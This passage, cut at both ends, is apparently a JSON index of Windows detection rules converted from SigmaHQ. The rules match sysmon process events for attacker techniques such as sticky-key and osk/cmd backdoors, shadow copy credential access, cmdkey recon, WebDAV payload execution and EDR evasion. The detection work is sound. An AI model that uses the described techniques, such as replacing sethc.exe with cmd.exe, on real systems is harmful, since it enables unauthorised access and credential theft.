spoofable: 0\n  classification:\n   - attack.t1546.008\n\n  label: \"Potential Privilege Escalation Using Symlink Between Osk and Cmd\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_mklink_osk_cmd.yml", "version": "0.2", "versions": {"0.1": {"digest": "7cc0032fe75d6dd24d14a50914effccfc12922f0f5181f01e977ab62a6ed25d3"}, "0.2": {"digest": "28a7df469bd068fe675b405a2a13f42107b4d8fa71d73eb42d49135398762709"}}}, "sigmahq/proc_creation_win_cmd_mklink_shadow_copies_access_symlink": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_mklink_shadow_copies_access_symlink\ndescription: |\n  Shadow Copies storage symbolic link creation using operating systems utilities\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'mklink' && evt.Parsed.CommandLine contains 'HarddiskVolumeShadowCopy')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1003.002\n   - attack.t1003.003\n\n  label: \"VolumeShadowCopy Symlink Creation Via Mklink\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Shadow Copies storage symbolic link creation using operating systems utilities\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_mklink_shadow_copies_access_symlink.yml", "version": "0.2", "versions": {"0.1": {"digest": "5ace936c976ce2623dd9bb5b1a404f853062b202f8fe38444a3afe34d3579e5c"}, "0.2": {"digest": "767f7da83e7875d18d40e8f57e3f57552ce2076d39c9aced8e540c7b5b12b4af"}}}, "sigmahq/proc_creation_win_cmd_net_use_and_exec_combo": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_net_use_and_exec_combo\ndescription: |\n  Detects the execution of the \"net use\" command to mount a WebDAV server and then immediately execute some content in it. As seen being used in malicious LNK files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image contains '\\\\cmd.exe' || evt.Parsed.OriginalFileName == 'Cmd.EXE') && evt.Parsed.CommandLine contains ' net use http' && evt.Parsed.CommandLine contains '& start /b ' && evt.Parsed.CommandLine contains '\\\\DavWWWRoot\\\\' && (evt.Parsed.CommandLine contains '.exe ' || evt.Parsed.CommandLine contains '.dll ' || evt.Parsed.CommandLine contains '.bat ' || evt.Parsed.CommandLine contains '.vbs ' || evt.Parsed.CommandLine contains '.ps1 '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious File Execution From Internet Hosted WebDav Share\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the \"net use\" command to mount a WebDAV server and then immediately execute some content in it. As seen being used in malicious LNK files\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_net_use_and_exec_combo.yml", "version": "0.2", "versions": {"0.1": {"digest": "a2c1dc64b1ca53531de72d5084f673b202e2a39090c0f9ad14866023c29faf49"}, "0.2": {"digest": "559e61239685f2d4f79e8d20571f89283f99c565eec7f6c3630305a04bacf6d0"}}}, "sigmahq/proc_creation_win_cmd_no_space_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_no_space_execution\ndescription: |\n  Detects Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe. This could be a sign of obfuscation of a fat finger problem (typo by the developer). \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'cmd.exe/c' || evt.Parsed.CommandLine contains '\\\\cmd/c' || evt.Parsed.CommandLine contains '\"cmd/c' || evt.Parsed.CommandLine contains 'cmd.exe/k' || evt.Parsed.CommandLine contains '\\\\cmd/k' || evt.Parsed.CommandLine contains '\"cmd/k' || evt.Parsed.CommandLine contains 'cmd.exe/r' || evt.Parsed.CommandLine contains '\\\\cmd/r' || evt.Parsed.CommandLine contains '\"cmd/r' || evt.Parsed.CommandLine contains '/cwhoami' || evt.Parsed.CommandLine contains '/cpowershell' || evt.Parsed.CommandLine contains '/cschtasks' || evt.Parsed.CommandLine contains '/cbitsadmin' || evt.Parsed.CommandLine contains '/ccertutil' || evt.Parsed.CommandLine contains '/kwhoami' || evt.Parsed.CommandLine contains '/kpowershell' || evt.Parsed.CommandLine contains '/kschtasks' || evt.Parsed.CommandLine contains '/kbitsadmin' || evt.Parsed.CommandLine contains '/kcertutil' || evt.Parsed.CommandLine contains 'cmd.exe /c' || evt.Parsed.CommandLine contains 'cmd /c' || evt.Parsed.CommandLine contains 'cmd.exe /k' || evt.Parsed.CommandLine contains 'cmd /k' || evt.Parsed.CommandLine contains 'cmd.exe /r' || evt.Parsed.CommandLine contains 'cmd /r') && not (evt.Parsed.CommandLine contains 'cmd.exe /c ' || evt.Parsed.CommandLine contains 'cmd /c ' || evt.Parsed.CommandLine contains 'cmd.exe /k ' || evt.Parsed.CommandLine contains 'cmd /k ' || evt.Parsed.CommandLine contains 'cmd.exe /r ' || evt.Parsed.CommandLine contains 'cmd /r ' || evt.Parsed.CommandLine contains 'AppData\\\\Local\\\\Programs\\\\Microsoft VS Code\\\\resources\\\\app\\\\node_modules' || evt.Parsed.CommandLine endsWith 'cmd.exe/c .' || evt.Parsed.CommandLine == 'cmd.exe /c'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Cmd.EXE Missing Space Characters Execution Anomaly\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe. This could be a sign of obfuscation of a fat finger problem (typo by the developer). \n", "path": "scenarios/sigmahq/proc_creation_win_cmd_no_space_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "56f7b10281e382c17564ba56c07bc603ff76e80ed8139ab8d71d85e7a5a54875"}, "0.2": {"digest": "376e771a236a98ff46f0261a7eafafbc084bbdaf2287bd7be1dbd53718a48bb9"}}}, "sigmahq/proc_creation_win_cmd_ntdllpipe_redirect": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_ntdllpipe_redirect\ndescription: |\n  Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'type %windir%\\\\system32\\\\ntdll.dll' || evt.Parsed.CommandLine contains 'type %systemroot%\\\\system32\\\\ntdll.dll' || evt.Parsed.CommandLine contains 'type c:\\\\windows\\\\system32\\\\ntdll.dll' || evt.Parsed.CommandLine contains '\\\\ntdll.dll > \\\\\\\\.\\\\pipe\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"NtdllPipe Like Activity Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_ntdllpipe_redirect.yml", "version": "0.2", "versions": {"0.1": {"digest": "0214d8b7c8f7781718c1769d1bf3a7b8b209e052e3bbad8dd3f803cfc67ffde0"}, "0.2": {"digest": "2303eb172f4f3543be1086008cf07cf89aa5bae4a978e68121281ad91ae16aee"}}}, "sigmahq/proc_creation_win_cmd_path_traversal": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_path_traversal\ndescription: |\n  Detects potential path traversal attempt via cmd.exe. Could indicate possible command/argument confusion/hijacking\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.OriginalFileName == 'cmd.exe') && (evt.Parsed.ParentCommandLine contains '/c' || evt.Parsed.ParentCommandLine contains '/k' || evt.Parsed.ParentCommandLine contains '/r' || evt.Parsed.CommandLine contains '/c' || evt.Parsed.CommandLine contains '/k' || evt.Parsed.CommandLine contains '/r') && (evt.Parsed.ParentCommandLine == '/../../' || evt.Parsed.CommandLine contains '/../../') && not (evt.Parsed.CommandLine contains '\\\\Tasktop\\\\keycloak\\\\bin\\\\/../../jre\\\\bin\\\\java'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.003\n\n  label: \"Potential CommandLine Path Traversal Via Cmd.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential path traversal attempt via cmd.exe. Could indicate possible command/argument confusion/hijacking\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_path_traversal.yml", "version": "0.2", "versions": {"0.1": {"digest": "bcde67979a88cac15a8f7bb2c083cd37c77cf41a5e9872e026bc3fb2dbb38747"}, "0.2": {"digest": "5e978bd7842ade9dea428b0f0326eca774d3a3ab2eea045523763d6caacc511c"}}}, "sigmahq/proc_creation_win_cmd_ping_del_combined_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_ping_del_combined_execution\ndescription: |\n  Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' -n ' || evt.Parsed.CommandLine contains ' /n ' || evt.Parsed.CommandLine contains ' \u2013n ' || evt.Parsed.CommandLine contains ' \u2014n ' || evt.Parsed.CommandLine contains ' \u2015n ') && evt.Parsed.CommandLine contains 'Nul' && (evt.Parsed.CommandLine contains ' -f ' || evt.Parsed.CommandLine contains ' /f ' || evt.Parsed.CommandLine contains ' \u2013f ' || evt.Parsed.CommandLine contains ' \u2014f ' || evt.Parsed.CommandLine contains ' \u2015f ' || evt.Parsed.CommandLine contains ' -q ' || evt.Parsed.CommandLine contains ' /q ' || evt.Parsed.CommandLine contains ' \u2013q ' || evt.Parsed.CommandLine contains ' \u2014q ' || evt.Parsed.CommandLine contains ' \u2015q ') && evt.Parsed.CommandLine contains 'ping' && evt.Parsed.CommandLine contains 'del ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1070.004\n\n  label: \"Suspicious Ping/Del Command Combination\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_ping_del_combined_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "ec6d701923f21ce7fc99d32dbffe2b5a9d788ccbdba893fcdc004033ddb9f884"}, "0.2": {"digest": "26298272a4ceb6e8d42001679e65b92194c3bf73866beb455cb67482a5a418e1"}}}, "sigmahq/proc_creation_win_cmd_shadowcopy_access": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_shadowcopy_access\ndescription: |\n  Detects the execution of the builtin \"copy\" command that targets a shadow copy (sometimes used to copy registry hives that are in use)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'copy ' && evt.Parsed.CommandLine contains '\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1490\n\n  label: \"Copy From VolumeShadowCopy Via Cmd.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the builtin \"copy\" command that targets a shadow copy (sometimes used to copy registry hives that are in use)\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_shadowcopy_access.yml", "version": "0.2", "versions": {"0.1": {"digest": "b8131f3aad117e7e91470caef4a11ce59ddafbab823e0a3f0c1e2c7be0fb9b7d"}, "0.2": {"digest": "7acbb0663a57afc7a50c065cdbd411b9a9f73d5e0a6603be530b81821d224451"}}}, "sigmahq/proc_creation_win_cmd_sticky_key_like_backdoor_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_sticky_key_like_backdoor_execution\ndescription: |\n  Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\winlogon.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\wt.exe') && (evt.Parsed.CommandLine contains 'sethc.exe' || evt.Parsed.CommandLine contains 'utilman.exe' || evt.Parsed.CommandLine contains 'osk.exe' || evt.Parsed.CommandLine contains 'Magnify.exe' || evt.Parsed.CommandLine contains 'Narrator.exe' || evt.Parsed.CommandLine contains 'DisplaySwitch.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.008\n\n  label: \"Sticky Key Like Backdoor Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\n", "path": "scenarios/sigmahq/proc_creation_win_cmd_sticky_key_like_backdoor_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "a2ba5852fe923e77060b9dde3d1f101f7659ba7211773afb80f45c2d2422758a"}, "0.2": {"digest": "9068467e7caf775aeba43d47e3d9894a5684552a2b680498814def203903ea31"}}}, "sigmahq/proc_creation_win_cmd_sticky_keys_replace": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmd_sticky_keys_replace\ndescription: |\n  By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system. When the sticky keys are \"activated\" the privilleged shell is launched. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'copy ' && evt.Parsed.CommandLine contains '/y ' && evt.Parsed.CommandLine contains 'C:\\\\windows\\\\system32\\\\cmd.exe C:\\\\windows\\\\system32\\\\sethc.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.008\n\n  label: \"Persistence Via Sticky Key Backdoor\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system. When the sticky keys are \"activated\" the privilleged shell is launched. \n", "path": "scenarios/sigmahq/proc_creation_win_cmd_sticky_keys_replace.yml", "version": "0.2", "versions": {"0.1": {"digest": "8c75f1928c0d080221b5e9d8fca26b27c76b8b19c483dc7d302295e73fc9d987"}, "0.2": {"digest": "1640376da7ad3f62a8700a29095ea9cceee59987cdfface51ff945bde9241073"}}}, "sigmahq/proc_creation_win_cmdkey_recon": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmdkey_recon\ndescription: |\n  Detects usage of cmdkey to look for cached credentials on the system\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmdkey.exe' || evt.Parsed.OriginalFileName == 'cmdkey.exe') && (evt.Parsed.CommandLine contains ' -l' || evt.Parsed.CommandLine contains ' /l' || evt.Parsed.CommandLine contains ' \u2013l' || evt.Parsed.CommandLine contains ' \u2014l' || evt.Parsed.CommandLine contains ' \u2015l'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.005\n\n  label: \"Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of cmdkey to look for cached credentials on the system\n", "path": "scenarios/sigmahq/proc_creation_win_cmdkey_recon.yml", "version": "0.2", "versions": {"0.1": {"digest": "ab5fe26e85ea787fecd48766627a150f5b86646b63bf0912abebdcdd198cb5d5"}, "0.2": {"digest": "f30752db214b3bb1ee4d330af29f293ace7ded4c2e80d45cca6e57219f0d27b5"}}}, "sigmahq/proc_creation_win_cmstp_execution_by_creation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_cmstp_execution_by_creation\ndescription: |\n  Detects various indicators of Microsoft Connection Manager Profile Installer execution\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\cmstp.exe')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1218.003\n\n  label: \"CMSTP Execution Process Creation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution\n", "path": "scenarios/sigmahq/proc_creation_win_cmstp_execution_by_creation.yml", "version": "0.2", "versions": {"0.1": {"digest": "116ca17ddd57540a03b8406b0b0728f453de5a6d769b6177bd7b9d716d44996f"}, "0.2": {"digest": "dfc462b423ec6f933784c10bd44453ad5117d3ee4148b380dac3f0eb3061a522"}}}, "sigmahq/proc_creation_win_conhost_path_traversal": {"content": "type: trigger\nname: sigmahq/proc_creation_win_conhost_path_traversal\ndescription: |\n  detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentCommandLine contains 'conhost' && evt.Parsed.CommandLine contains '/../../')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.003\n\n  label: \"Conhost.exe CommandLine Path Traversal\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking\n", "path": "scenarios/sigmahq/proc_creation_win_conhost_path_traversal.yml", "version": "0.2", "versions": {"0.1": {"digest": "7172adb37ee65cb46ed93162382def4e11a144dbeaabe046b11c5765b928fb14"}, "0.2": {"digest": "acd114de45c7e37912897410ac8bc61793d5ecb7f44804793eea9b82563ef0e0"}}}, "sigmahq/proc_creation_win_control_panel_item": {"content": "type: trigger\nname: sigmahq/proc_creation_win_control_panel_item\ndescription: |\n  Detects the malicious use of a control panel item\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && evt.Parsed.CommandLine contains 'add' && evt.Parsed.CommandLine contains 'CurrentVersion\\\\Control Panel\\\\CPLs' || evt.Parsed.CommandLine endsWith '.cpl' && not (evt.Parsed.CommandLine contains '\\\\System32\\\\' || evt.Parsed.CommandLine contains '%System%' || evt.Parsed.CommandLine contains '|C:\\\\Windows\\\\system32|' || evt.Parsed.CommandLine contains 'regsvr32 ' && evt.Parsed.CommandLine contains ' /s ' && evt.Parsed.CommandLine contains 'igfxCPL.cpl'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.002\n   - attack.t1546\n\n  label: \"Control Panel Items\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the malicious use of a control panel item\n", "path": "scenarios/sigmahq/proc_creation_win_control_panel_item.yml", "version": "0.2", "versions": {"0.1": {"digest": "eac987c8c793d57ddbfb030ceccc61ad19fb9a000b16a5c9e00bcc9425fb8815"}, "0.2": {"digest": "80cb9465cb9ba6cd29f942ea294948b5b595f100a48b872bc606e4fc9705e351"}}}, "sigmahq/proc_creation_win_createdump_lolbin_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_createdump_lolbin_execution\ndescription: |\n  Detects uses of the createdump.exe LOLOBIN utility to dump process memory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\createdump.exe' || evt.Parsed.OriginalFileName == 'FX_VER_INTERNALNAME_STR') && (evt.Parsed.CommandLine contains ' -u ' || evt.Parsed.CommandLine contains ' --full ' || evt.Parsed.CommandLine contains ' -f ' || evt.Parsed.CommandLine contains ' --name ' || evt.Parsed.CommandLine contains '.dmp '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"CreateDump Process Dump\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uses of the createdump.exe LOLOBIN utility to dump process memory\n", "path": "scenarios/sigmahq/proc_creation_win_createdump_lolbin_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "7c641cec9008c2bb49cbae6cf8643846f8ab36d43b1ca9cc4a93a796ff92119f"}, "0.2": {"digest": "b99eeae293d3fdd0fb65730fa2326dc95cca72a4d573c072175ea4792e54815d"}}}, "sigmahq/proc_creation_win_csc_susp_parent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_csc_susp_parent\ndescription: |\n  Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\csc.exe' || evt.Parsed.OriginalFileName == 'csc.exe') && (evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\excel.exe' || evt.Parsed.ParentImage endsWith '\\\\mshta.exe' || evt.Parsed.ParentImage endsWith '\\\\onenote.exe' || evt.Parsed.ParentImage endsWith '\\\\outlook.exe' || evt.Parsed.ParentImage endsWith '\\\\powerpnt.exe' || evt.Parsed.ParentImage endsWith '\\\\winword.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe' || (evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe') && (evt.Parsed.ParentCommandLine contains '-Encoded ' || evt.Parsed.ParentCommandLine contains 'FromBase64String') || evt.Parsed.ParentCommandLine matches '([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\\\\\[Aa]pp[Dd]ata\\\\\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\\\\\[^\\\\\\\\]{1,256}$' || evt.Parsed.ParentCommandLine contains ':\\\\PerfLogs\\\\' || evt.Parsed.ParentCommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.ParentCommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.ParentCommandLine contains '\\\\Temporary Internet' || evt.Parsed.ParentCommandLine contains ':\\\\Users\\\\' && evt.Parsed.ParentCommandLine contains '\\\\Favorites\\\\' || evt.Parsed.ParentCommandLine contains ':\\\\Users\\\\' && evt.Parsed.ParentCommandLine contains '\\\\Favourites\\\\' || evt.Parsed.ParentCommandLine contains ':\\\\Users\\\\' && evt.Parsed.ParentCommandLine contains '\\\\Contacts\\\\' || evt.Parsed.ParentCommandLine contains ':\\\\Users\\\\' && evt.Parsed.ParentCommandLine contains '\\\\Pictures\\\\') && not (evt.Parsed.ParentImage startsWith 'C:\\\\Program Files (x86)\\\\' || evt.Parsed.ParentImage startsWith 'C:\\\\Program Files\\\\' || evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\sdiagnhost.exe' || evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe') && not (evt.Parsed.ParentImage == 'C:\\\\ProgramData\\\\chocolatey\\\\choco.exe' || evt.Parsed.ParentCommandLine contains '\\\\ProgramData\\\\Microsoft\\\\Windows Defender Advanced Threat Protection' || evt.Parsed.ParentCommandLine contains 'JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw' || evt.Parsed.ParentCommandLine contains 'cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA' || evt.Parsed.ParentCommandLine contains 'nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.005\n   - attack.t1059.007\n   - attack.t1218.005\n   - attack.t1027.004\n\n  label: \"Csc.EXE Execution Form Potentially Suspicious Parent\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery.\n", "path": "scenarios/sigmahq/proc_creation_win_csc_susp_parent.yml", "version": "0.2", "versions": {"0.1": {"digest": "fba06f4867295b1acca8f1b0bf25dbe0f9c35308faaa1edc0985a783e900dd33"}, "0.2": {"digest": "11c3a054d8eea6ccf6d3ba234fe73fa7a1e3c4bfc6047a6201823e27e9ad7a06"}}}, "sigmahq/proc_creation_win_csi_use_of_csharp_console": {"content": "type: trigger\nname: sigmahq/proc_creation_win_csi_use_of_csharp_console\ndescription: |\n  Detects the execution of CSharp interactive console by PowerShell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\csi.exe' && (evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe' || evt.Parsed.ParentImage endsWith '\\\\powershell_ise.exe') && evt.Parsed.OriginalFileName == 'csi.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1127\n\n  label: \"Suspicious Use of CSharp Interactive Console\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of CSharp interactive console by PowerShell\n", "path": "scenarios/sigmahq/proc_creation_win_csi_use_of_csharp_console.yml", "version": "0.2", "versions": {"0.1": {"digest": "1a82d5d7645f2896713d607f23ea481119b76ba63878e92e1bc857c7c308e41c"}, "0.2": {"digest": "0c65fd87f612940cd081465f35d3e901213a9839c19195b44a5c3d9c7445fb5b"}}}, "sigmahq/proc_creation_win_curl_download_direct_ip_susp_extensions": {"content": "type: trigger\nname: sigmahq/proc_creation_win_curl_download_direct_ip_susp_extensions\ndescription: |\n  Detects potentially suspicious file downloads directly from IP addresses using curl.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.OriginalFileName == 'curl.exe') && evt.Parsed.CommandLine matches '://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}' && evt.Parsed.CommandLine contains 'http' && (evt.Parsed.CommandLine contains ' -O' || evt.Parsed.CommandLine contains '--remote-name' || evt.Parsed.CommandLine contains '--output') && (evt.Parsed.CommandLine endsWith '.bat' || evt.Parsed.CommandLine endsWith '.bat\"' || evt.Parsed.CommandLine 